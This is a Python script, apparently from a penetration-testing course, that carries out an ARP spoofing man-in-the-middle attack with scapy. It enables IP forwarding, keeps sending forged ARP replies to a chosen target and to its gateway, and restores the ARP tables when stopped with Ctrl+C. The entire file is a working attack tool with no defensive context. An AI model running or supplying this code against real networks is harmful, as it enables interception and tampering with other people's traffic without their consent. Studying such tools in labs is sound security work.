#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import time
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target device IP.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP.")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an IP for the target device. Use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify an IP for the gateway. Use --help for more info.")
    return options


def get_mac(ip):
    # create a packet with desired ip range
    arp_request = scapy.ARP(pdst=ip)

    # create an Internet frame to broadcast packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # concatenate the 2 packets
    arp_request_broadcast = broadcast/arp_request

    # send and receive packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # return mac address of target ip
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False, count=4)


subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

ips = get_arguments()
target_ip = ips.target_ip
gateway_ip = ips.gateway_ip
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),  # python 2
        # print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # python3
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

